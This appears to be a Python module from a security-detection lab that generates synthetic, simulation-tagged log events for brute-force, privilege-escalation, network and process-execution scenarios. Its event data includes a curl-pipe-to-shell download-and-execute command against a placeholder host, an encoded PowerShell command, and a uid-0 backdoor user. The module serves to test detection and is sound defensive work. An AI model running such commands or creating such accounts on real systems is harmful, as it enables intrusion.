"""Safe, isolated lab scenario generators.

All events are synthetic and clearly tagged ``source_type=simulation``. No
external systems are contacted and no real credentials are used.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timedelta
from typing import Any

from ..collectors.normalizer import NormalizedEvent


def _event(
    *,
    minutes_ago: float,
    code: str,
    action: str,
    message: str,
    username: str,
    source_ip: str,
    host: str,
    destination_ip: str | None = None,
    extra: dict | None = None,
) -> NormalizedEvent:
    return NormalizedEvent(
        source_type="simulation",
        source_name="sentinelx-lab-simulator",
        event_code=code,
        action=action,
        username=username,
        source_ip=source_ip,
        destination_ip=destination_ip,
        host=host,
        timestamp=datetime.utcnow() - timedelta(minutes=minutes_ago),
        message=message,
        raw_event=f"[SIMULATED] {code} {action} user={username} src={source_ip} host={host} :: {message}",
        confidence=0.9,
        extra=extra or {},
        event_uid=uuid.uuid4().hex[:40],
    )


SCENARIOS = {
    "brute_force_login": "Repeated failed logins from one source IP.",
    "login_after_failures": "Failed logins followed by a successful login.",
    "suspicious_privileged_activity": "Privileged account activity from an external source.",
    "unusual_network_connections": "Burst of outbound connections including a suspicious port.",
    "suspicious_process_execution": "Encoded shell / download-and-execute commands.",
    "correlated_attack": "Full correlated attack chain across all detection categories.",
}


def generate_scenario(
    scenario: str,
    count: int = 10,
    source_ip: str = "203.0.113.77",
    username: str = "administrator",
    host: str = "WIN-SRV-01",
) -> list[NormalizedEvent]:
    count = max(1, min(500, int(count)))
    events: list[NormalizedEvent] = []
    now_minutes = 0.0

    if scenario in {"brute_force_login", "login_after_failures", "correlated_attack"}:
        for i in range(count):
            target = username if i < count - 2 else ["root", "guest", "admin"][i % 3]
            events.append(
                _event(
                    minutes_ago=30 - i * 0.5,
                    code="4625",
                    action="failure",
                    message="An account failed to log on (simulated password guess).",
                    username=target,
                    source_ip=source_ip,
                    host=host,
                )
            )
        now_minutes = 30 - count * 0.5 - 1

    if scenario in {"login_after_failures", "correlated_attack"}:
        events.append(
            _event(
                minutes_ago=now_minutes,
                code="4624",
                action="success",
                message="An account was successfully logged on (simulated).",
                username=username,
                source_ip=source_ip,
                host=host,
            )
        )

    if scenario in {"suspicious_privileged_activity", "correlated_attack"}:
        events.append(
            _event(
                minutes_ago=now_minutes - 1,
                code="4672",
                action="privilege",
                message="Special privileges assigned to new logon (simulated).",
                username=username,
                source_ip=source_ip,
                host=host,
            )
        )
        events.append(
            _event(
                minutes_ago=now_minutes - 2,
                code="USER_CREATED",
                action="privilege",
                message="new user: name=svc_backdoor uid=0 (simulated)",
                username=username,
                source_ip=source_ip,
                host=host,
                extra={"group": "sudo"},
            )
        )

    if scenario in {"unusual_network_connections", "correlated_attack"}:
        for i in range(max(count, 20)):
            events.append(
                _event(
                    minutes_ago=25 - i * 0.3,
                    code="NET_OUTBOUND",
                    action="network",
                    message=f"Outbound TCP connection to 198.51.100.{10 + i % 5}:{4444 if i == 3 else 443} (simulated)",
                    username=username,
                    source_ip=source_ip,
                    host=host,
                    destination_ip=f"198.51.100.{10 + i % 5}",
                    extra={"port": 4444 if i == 3 else 443},
                )
            )

    if scenario in {"suspicious_process_execution", "correlated_attack"}:
        for command in [
            "powershell.exe -enc SGVsbG8gV29ybGQ=",
            "/bin/bash -c 'curl http://example.invalid/payload.sh | sh'",
            "sudo -u root /usr/bin/whoami && net user",
        ]:
            events.append(
                _event(
                    minutes_ago=now_minutes - 4,
                    code="PROCESS_EXEC",
                    action="process",
                    message=command + " (simulated)",
                    username=username,
                    source_ip=source_ip,
                    host=host,
                    extra={"command": command},
                )
            )

    if scenario not in SCENARIOS:
        raise ValueError(f"Unknown scenario: {scenario}. Available: {', '.join(SCENARIOS)}")
    return events


def scenario_descriptions() -> dict[str, str]:
    return dict(SCENARIOS)
